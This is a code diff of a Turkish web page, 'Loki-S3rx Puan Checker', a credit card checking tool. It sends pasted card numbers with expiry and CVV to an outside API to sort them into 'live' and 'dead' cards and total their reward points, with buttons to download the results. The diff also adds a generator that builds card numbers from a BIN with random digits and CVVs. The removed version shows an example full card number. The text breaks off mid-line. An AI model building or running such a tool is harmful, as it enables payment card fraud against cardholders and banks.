@@ -1,153 +1,192 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-<meta charset="UTF-8">
-<title>Puan Checker</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>💳 Loki-S3rx Puan Checker</title>
 <style>
-    body {
-        background-color: #0d0d12;
-        color: white;
-        font-family: Arial, sans-serif;
-        padding: 20px;
-    }
+@import url('https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;700&display=swap');
 
-    .container {
-        max-width: 900px;
-        margin: auto;
-        padding: 20px;
-        border-radius: 12px;
-        background: #111118;
-        border: 1px solid #7d2bff;
-        box-shadow: 0 0 20px #7d2bff33;
-    }
-
-    textarea {
-        width: 100%;
-        height: 150px;
-        background: #000;
-        color: white;
-        border: 1px solid #7d2bff;
-        border-radius: 8px;
-        padding: 10px;
-    }
-
-    button {
-        width: 100%;
-        padding: 15px;
-        margin-top: 10px;
-        border: none;
-        border-radius: 10px;
-        font-size: 18px;
-        cursor: pointer;
-        font-weight: bold;
-        color: black;
-        transition: 0.2s;
-    }
-
-    #startBtn { background: #d066ff; }
-    #stopBtn { background: #b433ff; }
-
-    #startBtn:disabled {
-        opacity: 0.5;
-        cursor: not-allowed;
-    }
-
-    .cards-wrapper {
-        display: flex;
-        gap: 20px;
-        margin-top: 20px;
-    }
-
-    .panel {
-        flex: 1;
-        padding: 15px;
-        background: #0f0f14;
-        border-radius: 12px;
-        border: 1px solid #7d2bff88;
-    }
-
-    .live-card {
-        background: #143c2a;
-        padding: 10px;
-        border-radius: 8px;
-        margin-top: 10px;
-        border-left: 4px solid #32ff9c;
-        box-shadow: 0 0 10px #32ff9c88;
-    }
-
-    .dead-card {
-        background: #3b1016;
-        padding: 10px;
-        border-radius: 8px;
-        margin-top: 10px;
-        border-left: 4px solid #ff3277;
-        box-shadow: 0 0 10px #ff327788;
-    }
-
+body{
+  margin:0;background:#0a0a11;font-family:'Chakra Petch',sans-serif;color:#fff;
+}
+.bg-video{
+  position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;opacity:.33;z-index:-1;
+}
+.sidebar{
+  position:fixed;left:0;top:0;width:240px;height:100%;background:rgba(15,10,25,.7);
+  backdrop-filter:blur(12px);border-right:1px solid rgba(180,0,255,.4);padding:25px 0;
+}
+.sidebar h2{text-align:center;color:#c47eff;margin-bottom:25px;}
+.menu-btn{
+  padding:12px 20px;margin:8px 14px;border-radius:10px;background:rgba(255,255,255,0.06);
+  border:1px solid rgba(180,0,255,.4);cursor:pointer;transition:.2s;text-align:center;
+}
+.menu-btn:hover{background:rgba(180,0,255,.4);} 
+.main{
+  margin-left:260px;padding:30px;height:100vh;overflow-y:auto;
+}
+.panel{
+  display:none;max-width:900px;margin:auto;background:rgba(255,255,255,0.05);
+  border-radius:18px;padding:22px;border:1px solid rgba(180,0,255,.35);backdrop-filter:blur(10px);
+} 
+.panel.active{display:block;} 
+textarea,input{
+  width:100%;padding:12px;border-radius:10px;background:rgba(0,0,0,.35);
+  border:1px solid rgba(200,0,255,.3);color:#fff;margin-top:8px;
+} 
+button{
+  padding:14px;width:100%;border-radius:8px;background:#bd66ff;color:#000;font-weight:700;
+  border:0;margin-top:10px;cursor:pointer;transition:.2s;
+} 
+button:hover{background:#d48aff;} 
+.list-box{display:flex;gap:20px;margin-top:20px;} 
+.col{
+  flex:1;background:rgba(0,0,0,0.35);padding:15px;border-radius:12px;
+  border:1px solid rgba(255,255,255,0.1);max-height:420px;overflow-y:auto;
+} 
+.col h3{text-align:center;margin-bottom:10px;} 
+.live-item{
+  background:rgba(140,0,255,.25);margin-bottom:8px;padding:10px;border-left:4px solid #d27bff;
+  border-radius:8px;box-shadow:0 0 12px #b54dff;
+} 
+.dead-item{
+  background:rgba(255,0,80,.25);margin-bottom:8px;padding:10px;border-left:4px solid #ff4d7a;
+  border-radius:8px;box-shadow:0 0 12px #ff3b6b;
+} 
+#logBox{background:rgba(0,0,0,.45);border:1px solid rgba(255,255,255,.2);padding:10px;border-radius:10px;}
 </style>
 </head>
 <body>
+<video class="bg-video" autoplay loop muted playsinline><source src="https://cdn.coverr.co/videos/coverr-rain-on-window-1445/1080p.mp4" type="video/mp4"></video>
 
-<div class="container">
-    <h1>Puan Checker</h1>
+<div class="sidebar">
+  <h2>💳 Loki-S3rx Checker</h2>
+  <div class="menu-btn" onclick="showPanel('checker')">Puan Checker</div>
+  <div class="menu-btn" onclick="showPanel('generator')">CC Generator</div>
+  <div class="menu-btn" onclick="showPanel('logs')">Log Kayıtları</div>
+</div>
 
-    <textarea id="cardInput" placeholder="Kartları yaz örnek:
-4743401027803869|11|28|000"></textarea>
-
+<div class="main">
+  <div id="checker" class="panel active">
+    <h2>Puan Checker</h2>
+    <textarea id="cardsInput" rows="8" placeholder="Kartları alt alta yaz: 4743xxxxxxxxxxxx|11|28|000"></textarea>
     <button id="startBtn" onclick="startCheck()">Kontrol Başlat</button>
-    <button id="stopBtn" onclick="stopCheck()">Durdur</button>
+    <p id="statusText" style="margin-top:15px;color:#d7a7ff;"></p>
 
-    <h3 id="totalPoints">Toplam Puan: 0</h3>
+    <div class="list-box">
+      <div class="col">
+        <h3 style="color:#d27bff">LIVE Kartlar</h3>
+        <p id="liveTotal" style="text-align:center;color:#eebcff;font-size:18px;font-weight:600;">Toplam Puan: 0 TL</p>
+        <div id="liveList"></div>
+        <button onclick="downloadLive()">Tüm Aktifleri İndir</button>
+      </div>
 
-    <div class="cards-wrapper">
-        <div class="panel">
-            <h2 style="color:#32ff9c">LIVE Kartlar</h2>
-            <div id="liveList"></div>
-        </div>
-
-        <div class="panel">
-            <h2 style="color:#ff3277">DEAD Kartlar</h2>
-            <div id="deadList"></div>
-        </div>
+      <div class="col">
+        <h3 style="color:#ff7b9b">DEAD Kartlar</h3>
+        <div id="deadList"></div>
+        <button onclick="downloadDead()">Tüm Deadleri İndir</button>
+      </div>
     </div>
+
+  </div>
+
+  <div id="generator" class="panel">
+    <h2>CC Generator</h2>
+    <input id="bin" placeholder="BIN" />
+    <input id="month" placeholder="Ay" />
+    <input id="year" placeholder="Yıl" />
+    <input id="cvv" placeholder="CVV" />
+    <input id="amount" placeholder="Adet" />
+    <button onclick="generateCC()">Generate</button>
+    <textarea id="genResult" rows="10"></textarea>
+  </div>
+
+  <div id="logs" class="panel">
+    <h2>Log Kayıtları</h2>
+    <textarea id="logBox" rows="12" readonly></textarea>
+  </div>
 
 </div>
 
 <script>
+// PANEL GEÇİŞİ
+function showPanel(id){
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
 
-let stopFlag = false;
-let totalPoints = 0;
+// PUAN AYIKLAYICI
+function extractPuan(text){
+  let m = text.match(/Puan:\s*([0-9.,]+)/i);
+  if(!m) return 0;
+  let v = m[1].replace(/\./g,"").replace(",",".");
+  return parseFloat(v) || 0;
+}
 
-async function startCheck() {
-    stopFlag = false;
-    totalPoints = 0;
-    document.getElementById("totalPoints").innerText = "Toplam Puan: 0";
+// CHECKER
+async function startCheck(){
+  const btn=document.getElementById('startBtn');
+  btn.disabled=true;
+  btn.innerText='⏳ Bekle kanks… checkleniyor…';
 
-    const startBtn = document.getElementById("startBtn");
-    startBtn.disabled = true;
-    startBtn.innerText = "⏳ Bekle kanks...";
+  const lines=document.getElementById('cardsInput').value.trim().split("\n");
+  const liveList=document.getElementById('liveList');
+  const deadList=document.getElementById('deadList');
+  liveList.innerHTML='';
+  deadList.innerHTML='';
+  let sum=0;
 
-    document.getElementById("liveList").innerHTML = "";
-    document.getElementById("deadList").innerHTML = "";
+  for(const card of lines){
+    if(!card.trim()) continue;
 
-    let lines = document.getElementById("cardInput").value.split("\n").map(l => l.trim()).filter(l => l);
+    const r=await fetch(`https://oxyincxapi.alwaysdata.net/check/ownerapi.php?kart=${encodeURIComponent(card)}`);
+    const t=await r.text();
 
-    for (let line of lines) {
-        if (stopFlag) break;
+    const puan = extractPuan(t);
 
-        let result = await checkCardReal(line);
-        renderResult(result, line);
-
-        await new Promise(r => setTimeout(r, 600));
+    if(puan > 0){
+      sum += puan;
+      liveList.innerHTML += `<div class='live-item'><b>${card}</b><br>Puan: ${puan.toFixed(2)} TL</div>`;
+    } else {
+      deadList.innerHTML += `<div class='dead-item'><b>${card}</b><br>${t}</div>`;
     }
 
-    startBtn.disabled = false;
-    startBtn.innerText = "Kontrol Başlat";
+    document.getElementById('liveTotal').innerText = `Toplam Puan: ${sum.toFixed(2)} TL`;
+    await new Promise(r=>setTimeout(r,500));
+  }
+
+  btn.disabled=false;
+  btn.innerText='Kontrol Başlat';
 }
 
-function stopCheck() {
-    stopFlag = true;
+// İNDİRME
+function downloadLive(){
+  const text=[...document.querySelectorAll('.live-item')].map(x=>x.innerText).join("\n\n");
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([text]));
+  a.download='live.txt';
+  a.click();
 }
 
-function extractPuan(text) {
-    let match
+function downloadDead(){
+  const text=[...document.querySelectorAll('.dead-item')].map(x=>x.innerText).join("\n\n");
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([text]));
+  a.download='dead.txt';
+  a.click();
+}
+
+// GENERATOR
+function generateCC(){
+  let b=bin.value.trim(),m=month.value.trim(),y=year.value.trim(),c=cvv.value.trim(),n=parseInt(amount.value.trim());
+  let o='';
+  if(!b||!n){genResult.value='Hata: BIN ve adet zorunlu.';return;}
+  for(let i=0;i<n;i++){
+    let cn=b+Math.floor(Math.random()*10**(16-b.length)).toString().padStart(16-b.length,'0');
+    let mm=m||String(Math.floor(Math.random()*12)+1).padStart(2,'0');
+    let yy=y||String(Math.floor(Math.random()*5)+25);
+    let cv=c||String(Math.floor(Math.random()*900)+100);
+    o += `${cn}|${mm}|${yy}|${cv}\n`;
+  }
+  gen
